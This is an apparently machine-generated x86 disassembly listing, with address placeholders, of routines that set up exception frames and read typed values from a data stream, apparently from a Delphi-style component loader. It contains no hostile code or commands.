mov eax [ eax - 0x8 ]
call sub_418fb8
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_417502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417533
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4173e8
pop ecx
test al al
jne r-xdata
call sub_40390c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038b8
sub_417558
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4175d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403300
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4138b8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4175d5
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4173e8
pop ecx
test al al
jne r-xdata
call sub_40390c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038b8
sub_4175f8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417673
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418fb8
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403300
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417678
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_4173e8
pop ecx
test al al
jne r-xdata
call sub_40390c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4038b8
sub_41769c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4178bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418948
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418948
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41788d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41784b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_4172e8
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417360
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_417448
pop ecx
push ebp
call sub_4175f8
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417558
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_40393c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417360
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_417360
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178c4
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404e14
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403300
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413dc8
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_4172ac
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413c10
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_4172ac
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413c10
sub_417850
push ebp
call sub_4173c8
pop ecx
test al al
je r-xdata
call sub_4038b8
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403104
sub_4178d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417948
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_417933
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417948
mov eax [ ebp - 0x4 ]
call sub_416e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416fdc
retn
sub_417948
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d80
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417e50
mov eax [ ebp - 0x4 ]
call sub_417cec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403300
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417a0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403300
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41769c
mov eax [ ebp - 0x4 ]
call sub_417cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a11
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417a18
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418b24
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417ca0
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_4170e8
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417a5c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418b24
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417ca0
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4170e8
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417aa0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418b24
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417ca0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4170e8
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_417af0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418b24
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417ca0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4170e8
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417b34
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418b24
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416bc0
mov al [ eax + lookup_table_417b5b ]
jmp [ eax * 4 + jump_table_417b69 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4170e8
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403f44
mov eax esi
call j_sub_404320#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4170e8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417c34
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418b24
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4170e8
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_4170e8
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4170e8
jmp r-xdata
jmp r-xdata
call sub_416bc0
sub_417ca0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4170c4
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417c34
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418b24
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4170e8
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417cf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_4170c4
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418b24
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417c34
mov [ edi ] eax
sub_417d34
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417e25
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403e54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403eec
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e2c
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403054
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040b8
sub_417e50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418020
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4036d0#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418948
xor edx edx
push ebp
push j_sub_4036d0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404114
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404374
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403344
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410ae0
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403344
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410ae0
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4181d4
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4170d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4170d4
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410b50
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417e34
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418027
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edi ebx
jmp r-xdata
sub_417fda
add [ eax ] eax
add [ eax ] al
mov al 0x6d
inc eax
add dh ah
jg r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4038b8
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418027
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_418030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413760
mov ebx eax
test ebx ebx
je r-xdata
call sub_416bc0
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410bc4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418078
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416654
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413c10
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4180b8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418107
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41923c
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_411060
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41810e
lea eax [ ebp - 0x10 ]
call sub_40ec34
retn
sub_418114
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_4181c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4170c4
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417b34
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416654
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413c10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418b24
lea eax [ ebp - 0x4 ]
call sub_4054f4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_411114
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181cd
lea eax [ ebp - 0x8 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
sub_4181d4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4184cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184d6
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x24 ]
call sub_404534
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403e78
retn
jmp [ eax * 4 + jump_table_418264 ]
mov eax [ rw-data ]
call sub_416ba8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b50
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4170c4
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417184
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417b34
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410a7c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a18
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e54
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418984
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d54
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418a40
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d80
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418868
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4170c4
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4170c4
cmp al 0xd
jne r-xdata
push ebp
call sub_4180b8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417ca0
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4110d8
jmp r-xdata
push ebp
call sub_418114
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b50
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c34
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417b34
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418030
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b24
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bc4
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417b34
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b24
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4110a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b24
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b50
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4171dc
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4110a0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417b34
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418078
pop ecx
jmp r-xdata
sub_4184dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
